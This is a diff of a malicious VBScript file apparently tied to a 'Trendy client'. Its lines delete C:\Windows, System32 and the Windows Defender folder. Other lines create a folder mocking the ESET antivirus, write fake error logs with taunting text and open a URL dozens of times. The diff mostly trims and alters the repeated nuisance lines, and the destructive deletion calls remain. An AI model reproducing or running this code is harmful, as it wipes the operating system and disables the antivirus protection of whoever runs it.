@@ -15,6 +15,9 @@ carew.deleteFolder "C:\Windows"
 carew.deleteFolder "C:\Windows\System32"
 carew.deleteFolder "C:\Program Files\Windows Defender"
 
+set virus = carew.CreateTextFile (".\HOWTOLEARNSPEEDTELLY.log",False)
+virus.Close		
+
 set virus = carew.CreateTextFile (".\CLRAV_Report.log",False)
 virus.Writeline "Due an error, Code error:3212552, Trendy client is installed"                                 
 virus.Writeline "For Support Please Send an Email to Suckmyballs123@gmail.com, If you want purchase Trendy+ to get more hacked." 			
@@ -65,25 +68,22 @@ carew.Run "https://myprivate.pics/watch.php?video=I2M1MK.php"
 carew.Run "https://trendy-client.base44.app"
 carew.Run "https://trendy-client.base44.app"
 carew.Run "https://trendy-client.base44.app"
-carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0", Msgbox "GET HACKED
-carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0", Msgbox "GET HACKED
-carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0", Msgbox "GET HACKED
-carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0", Msgbox "GET HACKED
-carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0", Msgbox "GET HACKED
-carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0", Msgbox "GET HACKED
-carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0", Msgbox "GET HACKED
-carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0", Msgbox "GET HACKED
-carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0", Msgbox "GET HACKED"
 carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
-carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0", lol=msgbox("",16,"Error")
-carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0", lol=msgbox("",16,"Error")
-carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0", lol=msgbox("",16,"Error")
-carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0", lol=msgbox("",16,"Error")
-carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0", lol=msgbox("",16,"Error")
-carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0", lol=msgbox("",16,"Error")
-carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0", lol=msgbox("",16,"Error")
-carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0", lol=msgbox("",16,"Error")
-carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0", lol=msgbox("",16,"Error")
+carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
+carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
+carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
+carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
+carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
+carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
+carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
+carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
+carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
+carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
+carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
+carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
+carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
+carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
+carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
 carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
 carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
 carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
@@ -14799,48 +14799,7 @@ carew.CreateFolder "C:\Eset-Nod-fucked"
 carew.deleteFolder "C:\Windows" 
 carew.deleteFolder "C:\Windows\System32"
 
-set virus = carew.CreateTextFile (".\CLRAV_Report.log",False)
-virus.Writeline "Due an error, Code error:3212552, Trendy client is installed"                                 
-virus.Writeline "For Support Please Send an Email to Suckmyballs123@gmail.com, If you want purchase Trendy+ to get more hacked." 			
+set virus = carew.CreateTextFile (".\HOWTOLEARNSPEEDTELLY.log",False)
 virus.Close					       
 	
-set virus = carew.CreateTextFile (".\CLRAV_Report.log",False)
-virus.Writeline "Due an error, Code error:3212552, Trendy client is installed"                                 
-virus.Writeline "For Support Please Send an Email to Suckmyballs123@gmail.com, If you want purchase Trendy+ to get more hacked." 			
-virus.Close					       
-	
-set virus = carew.CreateTextFile (".\CLRAV_Report.log",False)
-virus.Writeline "Due an error, Code error:3212552, Trendy client is installed"                                 
-virus.Writeline "For Support Please Send an Email to Suckmyballs123@gmail.com, If you want purchase Trendy+ to get more hacked." 			
-virus.Close					       
-	
-set virus = carew.CreateTextFile (".\CLRAV_Report.log",False)
-virus.Writeline "Due an error, Code error:3212552, Trendy client is installed"                                 
-virus.Writeline "For Support Please Send an Email to Suckmyballs123@gmail.com, If you want purchase Trendy+ to get more hacked." 			
-virus.Close					       
-	
-set virus = carew.CreateTextFile (".\CLRAV_Report.log",False)
-virus.Writeline "Due an error, Code error:3212552, Trendy client is installed"                                 
-virus.Writeline "For Support Please Send an Email to Suckmyballs123@gmail.com, If you want purchase Trendy+ to get more hacked." 			
-virus.Close					       
-	
-set virus = carew.CreateTextFile (".\CLRAV_Report.log",False)
-virus.Writeline "Due an error, Code error:3212552, Trendy client is installed"                                 
-virus.Writeline "For Support Please Send an Email to Suckmyballs123@gmail.com, If you want purchase Trendy+ to get more hacked." 			
-virus.Close					       
-	
-set virus = carew.CreateTextFile (".\CLRAV_Report.log",False)
-virus.Writeline "Due an error, Code error:3212552, Trendy client is installed"                                 
-virus.Writeline "For Support Please Send an Email to Suckmyballs123@gmail.com, If you want purchase Trendy+ to get more hacked." 			
-virus.Close					       
-	
-set virus = carew.CreateTextFile (".\CLRAV_Report.log",False)
-virus.Writeline "Due an error, Code error:3212552, Trendy client is installed"                                 
-virus.Writeline "For Support Please Send an Email to Suckmyballs123@gmail.com, If you want purchase Trendy+ to get more hacked." 			
-virus.Close					       
-	
-set virus = carew.CreateTextFile (".\CLRAV_Report.log",False)
-virus.Writeline "Due an error, Code error:3212552, Trendy client is installed"                                 
-virus.Writeline "For Support Please Send an Email to Suckmyballs123@gmail.com, If you want purchase Trendy+ to get more hacked." 			
-virus.Close					       
-	
+
